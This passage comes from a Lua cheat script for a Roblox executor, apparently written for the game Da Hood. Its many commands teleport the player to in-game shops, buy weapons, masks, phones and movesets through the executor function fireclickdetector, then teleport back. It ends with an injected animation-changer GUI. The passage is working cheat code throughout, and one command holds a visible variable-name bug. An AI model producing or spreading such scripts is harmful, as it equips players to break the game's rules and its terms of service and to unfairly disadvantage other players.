				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Bat] - $250"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "revolver";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Revolver] - $1300' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-867.581482, -32.6492004, -531.12439)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Revolver] - $1300") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Revolver] - $1300"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "smg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-810.008484, -39.6492004, -940.741943)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SMG] - $750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SMG] - $750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ar";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-815.723328, -39.6492004, -938.884155)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AR] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AR] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "hamburger";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-275.156769, 22.6498718, -805.798462)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Hamburger] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Hamburger] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "silencer";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-86.0817413, 21.75, -295.726318)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Silencer] - $400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Silencer] - $400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ak47";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-587.381653, 8.31478119, -751.274048)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AK47] - $2250'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AK47] - $2250'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "taser";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-271.231354, 21.7999573, -101.60965)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Taser] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Taser] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tactical";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(471.062164, 48.0705032, -622.478271)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshotgun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(471.062164, 48.0705032, -622.478271)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshotty";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(471.062164, 48.0705032, -622.478271)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "p90";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(465.413513, 48.0705032, -619.08551)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[P90] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[P90] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "silencerar";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(490.167664, 48.0705032, -631.357849)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SilencerAR] - $1250'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SilencerAR] - $1250'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flowers";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-73.9464569, 23.1322308, -309.301788)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flowers] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flowers] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "drumgun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-83.6302109, 22.5779362, -84.2232132)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[DrumGun] - $3000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[DrumGun] - $3000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "hockeymask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Hockey Mask] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-208.505066, 18.8557835, -831.299988, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Hockey Mask] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Hockey Mask] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ninjamask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Ninja Mask] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-219.205002, 18.853157, -826.599915, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Ninja Mask] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Ninja Mask] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "riotmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Riot Mask] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-257.291443, 18.9007416, -59.4864311, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Riot Mask] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Riot Mask] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lemonade";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-262.720337, 26.0190735, -507.681396)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Lemonade] - $3'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Lemonade] - $3'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lmg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-620.882263, 20.2999878, -305.339264, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[LMG] - $3750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[LMG] - $3750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "defaultmoveset";
		["Function"] = function()
			G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-228.841019, 22.0563946, -1140.28906)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Default Moveset] - $0'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Default Moveset] - $0'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "boxingmoveset";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-236.984741, 22.059906, -1139.94043)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['Boxing Moveset (Require: Max Box Stat) - $0'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['Boxing Moveset (Require: Max Box Stat) - $0'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "solobike";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-821.471558, 21.9998245, -547.333984)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SoloBike] - $25'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SoloBike] - $25'].ClickDetector)
			wait()
		end;
	});

	addCommand({
		["Name"] = "duobike";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-831.012817, 21.9998245, -547.12616)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[DuoBike] - $75'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[DuoBike] - $75'].ClickDetector)
			wait()
		end;
	});

	addCommand({
		["Name"] = "breathingmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-55.5208168, 19.749939, -84.2150803, -3.57627869e-07, 0.000610389397, 0.999999762, 0.00195324328, 0.999997914, -0.000610387418, -0.999998093, 0.00195324281, -1.54972076e-06)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Breathing Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Breathing Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "stopsign";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-225.701126, 21.75, -78.760376)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[StopSign] - $300'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[StopSign] - $300'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphonep";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-115.989037, 21.9033489, -865.403198)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneP] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneP] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "oldphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-104.374855, 21.908289, -883.721252)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Old Phone] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Old Phone] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "originalphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-98.6363907, 21.910841, -869.772522)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Original Phone] - $50'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Original Phone] - $50'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});


	-- Animation Changer GUI
	addCommand({
		["Name"] = "animations";
		["Function"] = function()
			local AnimationChanger = Instance.new("ScreenGui")
			local Main = Instance.new("Frame")
			local TopBar = Instance.new("Frame")
			local Close = Instance.new("TextButton")
			local TextLabel = Instance.new("TextLabel")
			local TextLabel_2 = Instance.new("TextLabel")
			local NormalTab = Instance.new("Frame")
			local A_Astronaut = Instance.new("TextButton")
			local A_Bubbly = Instance.new("TextButton")
			local A_Cartoony = Instance.new("TextButton")
			local A_Elder = Instance.new("TextButton")
			local A_Knight = Instance.new("TextButton")
			local A_Levitation = Instance.new("TextButton")
			local A_Mage = Instance.new("TextButton")
			local A_Ninja = Instance.new("TextButton")
			local A_Pirate = Instance.new("TextButton")
			local A_Robot = Instance.new("TextButton")
			local A_Stylish = Instance.new("TextButton")
			local A_SuperHero = Instance.new("TextButton")
			local A_Toy = Instance.new("TextButton")
			local A_Vampire = Instance.new("TextButton")
			local A_Werewolf = Instance.new("TextButton")
			local A_Zombie = Instance.new("TextButton")
			local Category = Instance.new("TextLabel")
			local SpecialTab = Instance.new("Frame")
			local A_Patrol = Instance.new("TextButton")
			local A_Confident = Instance.new("TextButton")
			local A_Popstar = Instance.new("TextButton")
			local A_Cowboy = Instance.new("TextButton")
			local A_Ghost = Instance.new("TextButton")
			local A_Sneaky = Instance.new("TextButton")
			local A_Princess = Instance.new("TextButton")
			local Category_2 = Instance.new("TextLabel")
			local OtherTab = Instance.new("Frame")
			local Category_3 = Instance.new("TextLabel")
			local A_None = Instance.new("TextButton")
			local A_Anthro = Instance.new("TextButton")

			AnimationChanger.Name = "AnimationChanger"
			AnimationChanger.Parent = game:WaitForChild("CoreGui")
			AnimationChanger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

			Main.Name = "Main"
			Main.Parent = AnimationChanger
			Main.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			Main.BorderSizePixel = 0
			Main.Position = UDim2.new(0.421999991, 0, -1, 0)
			Main.Size = UDim2.new(0, 300, 0, 250)
			Main.Active = true
			Main.Draggable = true

			TopBar.Name = "TopBar"
			TopBar.Parent = Main
			TopBar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			TopBar.BorderSizePixel = 0
			TopBar.Size = UDim2.new(0, 300, 0, 30)

			Close.Name = "Close"
			Close.Parent = TopBar
			Close.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			Close.BorderSizePixel = 0
			Close.Position = UDim2.new(0.899999976, 0, 0, 0)
			Close.Size = UDim2.new(0, 30, 0, 30)
			Close.Font = Enum.Font.SciFi
			Close.Text = "x"
			Close.TextColor3 = Color3.new(1, 0, 0.0156863)
			Close.TextSize = 20
			Close.MouseButton1Click:Connect(function()
				wait(0.3)
				Main:TweenPosition(UDim2.new(0.421999991, 0, -1.28400004, 0))
				wait(3)
				AnimationChanger:Destroy()
			end)

			TextLabel.Parent = TopBar
			TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0, 0, 0.600000024, 0)
			TextLabel.Size = UDim2.new(0, 270, 0, 10)
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.Text = "Fixed by Compwnter#5640"
			TextLabel.TextColor3 = Color3.new(1, 1, 1)
			TextLabel.TextSize = 15

			TextLabel_2.Parent = TopBar
			TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel_2.BackgroundTransparency = 1
			TextLabel_2.BorderSizePixel = 0
			TextLabel_2.Position = UDim2.new(0, 0, -0.0266667679, 0)
			TextLabel_2.Size = UDim2.new(0, 270, 0, 20)
			TextLabel_2.Font = Enum.Font.SourceSans
			TextLabel_2.Text = "Animation Changer"
			TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
			TextLabel_2.TextSize = 20

			NormalTab.Name = "NormalTab"
			NormalTab.Parent = Main
			NormalTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			NormalTab.BackgroundTransparency = 1
			NormalTab.BorderSizePixel = 0
			NormalTab.Position = UDim2.new(0.5, 0, 0.119999997, 0)
			NormalTab.Size = UDim2.new(0, 150, 0, 500)

			A_Astronaut.Name = "A_Astronaut"
			A_Astronaut.Parent = NormalTab
			A_Astronaut.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Astronaut.BorderSizePixel = 0
			A_Astronaut.Position = UDim2.new(0, 0, 0.815764725, 0)
			A_Astronaut.Size = UDim2.new(0, 150, 0, 30)
			A_Astronaut.Font = Enum.Font.SciFi
			A_Astronaut.Text = "Astronaut"
			A_Astronaut.TextColor3 = Color3.new(1, 1, 1)
			A_Astronaut.TextSize = 20
			A_Astronaut.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Bubbly.Name = "A_Bubbly"
			A_Bubbly.Parent = NormalTab
			A_Bubbly.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Bubbly.BorderSizePixel = 0
			A_Bubbly.Position = UDim2.new(0, 0, 0.349019617, 0)
			A_Bubbly.Size = UDim2.new(0, 150, 0, 30)
			A_Bubbly.Font = Enum.Font.SciFi
			A_Bubbly.Text = "Bubbly"
			A_Bubbly.TextColor3 = Color3.new(1, 1, 1)
			A_Bubbly.TextSize = 20
			A_Bubbly.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cartoony.Name = "A_Cartoony"
			A_Cartoony.Parent = NormalTab
			A_Cartoony.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cartoony.BorderSizePixel = 0
			A_Cartoony.Position = UDim2.new(0, 0, 0.407272667, 0)
			A_Cartoony.Size = UDim2.new(0, 150, 0, 30)
			A_Cartoony.Font = Enum.Font.SciFi
			A_Cartoony.Text = "Cartoony"
			A_Cartoony.TextColor3 = Color3.new(1, 1, 1)
			A_Cartoony.TextSize = 20
			A_Cartoony.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Elder.Name = "A_Elder"
			A_Elder.Parent = NormalTab
			A_Elder.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Elder.BorderSizePixel = 0
			A_Elder.Position = UDim2.new(6.51925802e-09, 0, 0.636310041, 0)
			A_Elder.Size = UDim2.new(0, 150, 0, 30)
			A_Elder.Font = Enum.Font.SciFi
			A_Elder.Text = "Elder"
			A_Elder.TextColor3 = Color3.new(1, 1, 1)
			A_Elder.TextSize = 20
			A_Elder.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Knight.Name = "A_Knight"
			A_Knight.Parent = NormalTab
			A_Knight.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Knight.BorderSizePixel = 0
			A_Knight.Position = UDim2.new(0, 0, 0.52352941, 0)
			A_Knight.Size = UDim2.new(0, 150, 0, 30)
			A_Knight.Font = Enum.Font.SciFi
			A_Knight.Text = "Knight"
			A_Knight.TextColor3 = Color3.new(1, 1, 1)
			A_Knight.TextSize = 20
			A_Knight.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
